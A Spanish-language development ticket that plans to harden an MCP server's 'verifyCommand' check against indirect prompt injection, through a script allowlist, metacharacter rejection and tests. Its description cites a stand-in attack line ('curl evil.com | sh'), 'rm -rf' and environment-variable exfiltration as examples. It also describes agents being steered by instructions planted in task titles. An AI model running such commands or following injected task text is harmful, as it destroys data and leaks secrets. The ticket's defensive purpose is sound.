---
id: DEV-244
title: "Endurecimiento de verifyCommand en Gatekeeper MCP contra prompt injection (allowlist de scripts package.json y anti-subshell)"
status: draft
created_date: '2026-10-11'
updated_date: '2026-10-11'
labels:
  - "security"
  - "mcp"
  - "prompt-injection"
  - "quality-gate"
dependencies:
  - "DEV-242"
priority: high
type: bug
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
Endurecimiento del Gatekeeper de ejecución de verificación en `scripts/mcp-server.ts`:

Aunque la Fase 2 (DEV-242 / SEC-01) erradicó la lectura ciega de comandos desde el frontmatter YAML en disco, un agente de IA que sea inducido mediante prompt injection indirecto (por ejemplo, a través de instrucciones maliciosas en el título o descripción de una tarea externa) podría pasar un comando shell arbitrario destructivo en el argumento `verifyCommand` (`curl evil.com | sh`, `rm -rf`, exfiltración de variables de entorno).

Para mitigar este vector:
1. **Restricción a scripts de `package.json` o binarios autorizados:**
   - `verifyCommand` solo puede invocar scripts existentes en el `package.json` del repositorio (`npm test`, `npm run <script>`, `npx <allowed-tool>`).
2. **Rechazo estricto de metacaracteres shell:**
   - Prohibir operadores de tubería, encadenamiento y redirección (`|`, `&`, `;`, `` ` ``, `$()`, `<`, `>`).
3. **Validación previa sin ejecución:**
   - Si el comando contiene caracteres prohibidos o no coincide con los scripts autorizados, el Gatekeeper rechaza la transición de inmediato con un error descriptivo sin invocar subshells.
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria

<!-- AC:BEGIN -->
- [ ] #1 scripts/mcp-server.ts restringe verifyCommand exclusivamente a scripts definidos en package.json (npm test, npm run <script>) o comandos de allowlist segura
- [ ] #2 Rechazo estricto de metacaracteres de encadenamiento o subshell (| & ; ` $() < >) en verifyCommand
- [ ] #3 Invocaciones con comandos no autorizados devuelven error descriptivo del Gatekeeper antes de spawnear cualquier proceso
- [ ] #4 scripts/verify-mcp-binary.js incluye pruebas automatizadas de rechazo ante inyección de comandos en verifyCommand
- [ ] #5 Pirámide de verificación en verde (tsc, npm test, backlog:sync, backlog:check, publish:check, build)
<!-- AC:END -->

## Implementation Plan

<!-- SECTION:PLAN:BEGIN -->
1. En `scripts/mcp-server.ts`:
   - Implementar función de validación `validateVerifyCommand(cmd: string, repoPath: string): { valid: boolean; reason?: string }`.
   - Inspeccionar scripts de `package.json` en `repoPath`.
   - Validar sintaxis y ausencia de metacaracteres peligrosos.
2. Re-empaquetar binario standalone `bin/gripm-mcp.js`.
3. Añadir pruebas en `scripts/verify-mcp-binary.js`.
4. Ejecutar Pirámide de Verificación y certificar en `ready`.
<!-- SECTION:PLAN:END -->

## Implementation Notes

<!-- SECTION:NOTES:BEGIN -->
<!-- SECTION:NOTES:END -->
